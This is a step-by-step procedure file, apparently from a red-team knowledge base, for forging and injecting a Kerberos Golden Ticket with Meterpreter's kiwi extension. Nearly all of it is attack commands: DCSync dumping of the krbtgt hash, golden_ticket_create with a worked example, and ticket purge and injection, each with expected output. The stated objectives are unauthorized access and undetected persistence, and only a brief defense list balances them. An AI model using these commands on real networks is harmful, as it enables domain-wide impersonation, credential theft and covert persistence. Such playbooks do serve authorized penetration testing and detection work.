---
id: 1a97f633-126e-4ce6-ab57-8c47934e0802
name: pass-the-golden-ticket-attack-using-meterpreter
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.763226+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Custom Cryptographic Protocol|T1024 - Custom Cryptographic
    Protocol]]
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
  - >-
    [[techniques/Use Alternate Authentication Material|T1550 - Use Alternate
    Authentication Material]]
sub_techniques:
  - '[[sub-techniques/Golden Ticket|T1558.001 - Golden Ticket]]'
  - '[[sub-techniques/Pass the Ticket|T1550.003 - Pass the Ticket]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos Tickets]]'
  - '[[tags/Pass-the-Ticket Golden Tickets]]'
  - '[[tags/Using Meterpreter]]'
commands:
  - '[[commands/load-kiwi-extension]]'
  - '[[commands/dcsync-ntlm-hash-for-krbtgt]]'
  - '[[commands/dcsync-secrets-for-krbtgt]]'
  - '[[commands/golden-ticket-create]]'
  - '[[commands/kerberos-ticket-purge]]'
  - '[[commands/kerberos-ticket-use]]'
  - '[[commands/kerberos-ticket-list]]'
platforms:
  - Windows
tools:
  - '[[tools/kiwi-metasploit-extension]]'
validated: true
---

# pass-the-golden-ticket-attack-using-meterpreter

## Summary

A Pass-the-Golden-Ticket attack is a technique used by attackers to gain unauthorized access to a network by forging Kerberos tickets. This attack can be performed using Meterpreter, a popular post-exploitation tool. By creating a Golden Ticket using kiwi, an attacker can impersonate any user in the domain and gain access to any resource. This technique is particularly dangerous because it allows the attacker to persist in the network without being detected.

## Description

A Pass-the-Golden-Ticket attack is a technique used by attackers to gain unauthorized access to a network by forging Kerberos tickets. This attack can be performed using Meterpreter, a popular post-exploitation tool. By creating a Golden Ticket using kiwi, an attacker can impersonate any user in the domain and gain access to any resource. This technique is particularly dangerous because it allows the attacker to persist in the network without being detected. The process involves extracting the NT hash of the krbtgt account, forging a ticket-granting ticket (TGT) with elevated privileges, purging existing tickets, injecting the forged ticket, and using it for authentication across the domain.

## Requirements

1. Valid domain credentials with sufficient privileges to run DCSync (typically Domain Admin or equivalent)
2. Access to a compromised machine with an active Meterpreter session
3. Kiwi extension loaded in Metasploit/Meterpreter
4. Knowledge of the domain SID, krbtgt NT hash, and target user account

## Defense

Defensive measures and detection strategies:

- Implement strong password policies and multi-factor authentication to prevent credential theft
- Monitor for unusual activity in the network, such as unusual logins or access to sensitive resources
- Regularly review and remove unnecessary privileges to limit the potential impact of a Golden Ticket attack
- Enable Kerberos auditing and monitor for anomalous ticket requests or DCSync replication attempts
- Use tools like Microsoft ATA or ELK stacks to detect forged ticket usage

## Objectives

1. Gain unauthorized access to a network
2. Impersonate any user in the domain
3. Persist in the network without being detected

## Instructions

### Step 1: Load the Kiwi Extension

**Context**: Load the kiwi credential dumping extension into the Meterpreter session to enable Kerberos ticket manipulation and DCSync capabilities. This step is necessary before any credential extraction or ticket forging can occur.

**Command** ([[commands/load-kiwi-extension]]):
```meterpreter
load kiwi
```

> This command loads the kiwi module. If successful, you will see a confirmation message indicating kiwi is ready for use. Failure may indicate compatibility issues with the Metasploit version or target architecture.

### Step 2: Extract NTLM Hash for krbtgt Account

**Context**: Use DCSync to retrieve the NTLM hash of the krbtgt account, which is required to sign the forged Golden Ticket. This simulates domain controller replication to dump credentials without direct DC access.

**Command** ([[commands/dcsync-ntlm-hash-for-krbtgt]]):
```meterpreter
dcsync_ntlm krbtgt
```

> Expected output includes the NTLM hash of the krbtgt user (e.g., a 32-character hex string like d125e4f69c851529045ec95ca80fa37e). Verify the hash is captured; if not, ensure domain replication rights.

### Step 3: Dump Secrets for krbtgt Account

**Context**: Perform a full DCSync on the krbtgt account to gather additional secrets, including any supplemental credentials that might be needed for ticket validation.

**Command** ([[commands/dcsync-secrets-for-krbtgt]]):
```meterpreter
dcsync krbtgt
```

> Expected output is a detailed dump of krbtgt attributes, including hashes and tickets. Confirm the NTLM hash matches the previous step; this provides comprehensive credential data.

### Step 4: Create the Golden Ticket

**Context**: Forge the Golden Ticket using the extracted krbtgt NT hash, domain SID, and target user details. This creates a TGT that grants domain-wide access without password validation.

**Command** ([[commands/golden-ticket-create]]):
```meterpreter
golden_ticket_create -d $_DOMAIN -k $_KRBGTG_NT_HASH -s $_DOMAIN_SID -u $_TARGET_USER -t $_TICKET_FILE
```

> Example with specifics: golden_ticket_create -d pentestlab.local -k d125e4f69c851529045ec95ca80fa37e -s S-1-5-21-3737340914-2019594255-2413685307 -u pentestlabuser -t /root/Downloads/pentestlabuser.tck. Expected output confirms ticket creation and saves it to the specified file path. Verify the file exists and contains binary ticket data.

### Step 5: Purge Existing Kerberos Tickets

**Context**: Clear any legitimate Kerberos tickets from the current session to ensure the forged Golden Ticket is used for subsequent authentications.

**Command** ([[commands/kerberos-ticket-purge]]):
```meterpreter
kerberos_ticket_purge
```

> Expected output indicates all tickets have been removed. This prevents conflicts with the new ticket.

### Step 6: Inject and Use the Golden Ticket

**Context**: Load the forged ticket into the session's credential cache for immediate use in domain authentication.

**Command** ([[commands/kerberos-ticket-use]]):
```meterpreter
kerberos_ticket_use $_TICKET_FILE
```

> Example: kerberos_ticket_use /root/Downloads/pentestlabuser.tck. Expected output confirms the ticket is imported and active. Test by attempting domain resource access.

### Step 7: List Available Kerberos Tickets

**Context**: Verify the Golden Ticket is now active and listed among available tickets for the session.

**Command** ([[commands/kerberos-ticket-list]]):
```meterpreter
kerberos_ticket_list
```

> Expected output shows a list of tickets, including the new Golden Ticket with details like validity period (typically 10 years) and associated user/SID. Confirm the target user and domain match.
